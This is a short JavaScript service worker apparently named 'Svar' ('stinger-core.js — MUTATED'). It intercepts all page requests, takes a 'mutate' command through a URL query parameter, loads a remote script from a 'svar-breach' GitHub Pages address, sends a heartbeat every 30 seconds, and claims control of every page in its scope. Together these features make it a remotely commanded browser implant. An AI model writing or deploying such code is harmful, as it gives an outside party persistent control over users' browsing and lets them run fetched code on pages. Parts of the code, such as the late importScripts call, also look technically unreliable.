// stinger-core.js — MUTATED

const SvarState = {
  version: '0.2',
  mode: 'mutation',
  guardians: [],
  codex: {}
};

// Intercept all fetch requests
self.addEventListener('fetch', event => {
  const url = new URL(event.request.url);

  // Check for mutation commands via query param
  if (url.searchParams.has('cmd')) {
    const cmd = url.searchParams.get('cmd');
    console.log('[Svar] Received command:', cmd);

    if (cmd === 'mutate') {
      mutate();
    }
  }

  event.respondWith(fetch(event.request));
});

function mutate() {
  console.log('[Svar] MUTATION initiated');

  // Example: Load external module (guardian logic)
  importScripts('https://kishan5965.github.io/svar-breach/guardian-core.js');

  // Add pulse loop
  setInterval(() => {
    fetch('./ping?status=heartbeat')
      .then(() => console.log('[Svar] heartbeat sent'))
      .catch(() => console.warn('[Svar] heartbeat failed'));
  }, 30000); // every 30s

  SvarState.mode = 'evolving';
  console.log('[Svar] Mutation complete — state:', SvarState);
}

// Force immediate control of all pages under scope
self.addEventListener('activate', event => {
  event.waitUntil(self.clients.claim());
  console.log('[Svar] Service worker claimed control of all clients');
});

console.log('[Svar] Mutated stinger-core initialized');
